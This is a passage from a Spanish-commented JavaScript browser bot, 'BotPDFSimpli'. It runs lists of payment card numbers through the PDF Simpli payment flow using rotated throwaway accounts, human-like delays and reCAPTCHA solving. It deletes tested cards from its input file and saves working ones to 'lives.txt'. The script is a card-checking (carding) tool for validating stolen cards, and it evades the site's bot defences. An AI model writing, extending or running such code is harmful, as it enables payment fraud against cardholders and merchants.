                            // Si el flujo completo falla, no intentamos más tarjetas con esta cuenta
                            break;
                        }
                    } else {
                        this.log(`⚡ TARJETA RÁPIDA ${intentos + 1}/3: ${tarjeta.numero}`);
                        const exito = await this.ejecutarFlujoTarjetaRapido(tarjeta, intentos);
                        await this.procesarResultadoTarjeta(tarjeta, exito);
                        if (exito) cuentaValido = true;
                    }

                    this.eliminarTarjetaDelArchivo(tarjeta);
                    tarjetasProcesadas++;
                    intentos++;

                    if (!cuentaValido && intentos < 3) {
                        await this.delayHumano();
                    }
                }

                this.cuentaActual.ultimoUso = new Date().toISOString();
                this.guardarCuentas();

                await this.browser?.close();
                this.browser = null;

                if (tarjetasProcesadas < tarjetas.length) {
                    await this.delayHumano(3000, 5000);
                }
            }

            this.mostrarEstadisticas();

        } catch (e) {
            this.logError(e, 'ejecutarProcesoCompleto');
        } finally {
            await this.browser?.close();
        }
    }

    mostrarEstadisticas() {
        this.log(`\n📊 ========== ESTADÍSTICAS FINALES ==========`, 'SUCCESS');
        this.log(`🎯 Tarjetas procesadas: ${this.estadisticas.tarjetasProcesadas}`, 'SUCCESS');
        this.log(`✅ Tarjetas válidas: ${this.estadisticas.tarjetasValidas}`, 'SUCCESS');
        this.log(`👤 Cuentas usadas: ${this.estadisticas.cuentasUsadas}`, 'SUCCESS');
        this.log(`🛡️  reCAPTCHAs resueltos: ${this.estadisticas.recaptchasResueltos}`, 'SUCCESS');
        this.log(`👨‍💻 reCAPTCHAs manuales: ${this.estadisticas.recaptchasManuales}`, 'SUCCESS');
        this.log(`🔄 Reintentos de clic: ${this.estadisticas.reintentosClic}`, 'SUCCESS');
        this.log(`⏱️ Tiempo total de espera: ${Math.round(this.estadisticas.tiempoEsperaAcumulado/1000)} segundos`, 'SUCCESS');
        this.log(`💾 Tarjetas válidas guardadas en: ${this.archivoLives}`, 'SUCCESS');
    }
}

// ============================================================
// EJECUCIÓN PRINCIPAL - MENSAJES ACTUALIZADOS PARA UBUNTU
// ============================================================
(async () => {
    console.log('========================================');
    console.log('🤖 BOT PDF SIMPLI - ADAPTADO PARA UBUNTU 20.04');
    console.log('========================================');
    console.log('🔄 FLUJO CORREGIDO:');
    console.log('   1. 📁 Subir PDF');
    console.log('   2. 🔄 Convertir PDF'); 
    console.log('   3. ⬇️  Hacer clic en Download');
    console.log('   4. 👤 Registro de cuenta');
    console.log('   5. 💳 Proceso de pago');
    console.log('========================================');
    console.log('🖥️  Configurado para VNC (:1) en Ubuntu');
    console.log('⚡ Chromium path: /bin/chromium-browser');
    console.log('📁 Archivos en: ~/Downloads/');
    console.log('========================================');
    
    const bot = new BotPDFSimpli();
    await bot.ejecutarProcesoCompleto();
    
    console.log('========================================');
    console.log('✨ FIN DEL PROCESO');
    console.log('✨ Revisa ~/Downloads/bot_log.txt');
    console.log('✨ Tarjetas válidas en ~/Downloads/lives.txt');
    console.log('========================================');
})();